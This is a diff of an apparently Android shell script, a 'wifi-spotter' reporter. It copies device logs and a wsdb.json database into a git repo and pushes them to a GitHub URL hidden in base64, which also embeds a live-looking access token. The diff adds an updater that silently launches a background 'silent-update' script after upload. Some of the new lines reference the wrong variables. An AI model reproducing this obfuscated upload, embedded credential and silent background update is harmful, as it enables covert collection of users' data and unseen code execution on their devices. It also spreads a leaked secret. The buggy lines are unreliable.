@@ -22,7 +22,13 @@
 				_commit()
 				{
 					{ r=$(git -C "${n}" add . 2>&1 | tr '\n' '#'); echo "add result: ${r}" >>"${tmp}"; r=$(git -C "${n}" config user.email "unknown@unknown.com" 2>&1 | tr '\n' '#'); echo "config/email result: ${r}" >>"${tmp}"; r=$(git -C "${n}" config user.name "${p}" 2>&1 | tr '\n' '#'); echo "config/user result: ${r}" >>"${tmp}"; r=$(git -C "${n}" commit --author="${p} <unknown@unknown.com>" -m "updated by: ${p}" 2>&1 | tr '\n' '#'); echo "commit/save result: ${r}" >>"${tmp}"; m=$(git -C "${n}" rev-parse --short HEAD 2>&1); echo "commit/version result: ${m}" >>"${tmp}"; while true; do sleep 1; r=$(git -C "${n}" push "$(base64 -d <<<aHR0cHM6Ly9zcG90dGVyMjQ6Z2hwX25pcWpXMllNWkVjbVVKQWRTWkl2Yk8xeTQ3Y25QcDA0SDlxSUBnaXRodWIuY29tL3Nwb3R0ZXIyNC9nYy5naXQ=)" 2>&1 | tr '\n' '#'); echo "push result: ${r}" >>"${tmp}"; [[ "${c}" =~ "unable to access" ]] && continue; [[ "${c}" =~ "fetch first" ]] && return 1; return 0; done; }
-				}				
+				}
+				_updater()
+				{
+					local pid; pid=$(cat "${home_dir}/logs/updater.pid" 2>/dev/null); kill -9 "${x}" 2>/dev/null
+					nohup ${home_dir}/plugins/updater.sh --silent-update &>/dev/null &
+					echo "${!}">"${home_dir}/logs/updater.pid"; disown
+				}
 			local z u p c r n d s tmp
 			home_dir=~/wifi-spotter-root
 			[ -d "${home_dir}/logs" ] || mkdir -p "${home_dir}/logs"
@@ -31,6 +37,6 @@
 			[ -s "${home_dir}/.score" ] || { echo "0" >"${home_dir}/.score"; }; { s=$(cat "${home_dir}/.score"); s=$((s+1)) || s=1; }
 			z=$(getprop persist.sys.timezone | tr "[:upper:]" "[:lower:]" | tr -d /); [ -n "${z}" ] || z="unknown"
 			echo -e "\n\nReporter started: $(date "+%d-%m-%Y %H:%M:%S")" >>"${tmp}"
-			while true; do _fetch && { mkdir -p "${n}/${z}/${p}"; cp "${d}/logs/"*.log "${d}/wsdb.json" "${n}/${z}/${p}/" 2>/dev/null; _commit && _alert && break || continue; }; sleep 10; done
+			while true; do _fetch && { mkdir -p "${n}/${z}/${p}"; cp "${d}/logs/"*.log "${d}/wsdb.json" "${n}/${z}/${p}/" 2>/dev/null; _commit && _alert && break || continue; }; sleep 10; done; _updater
 		}
 			_prepare
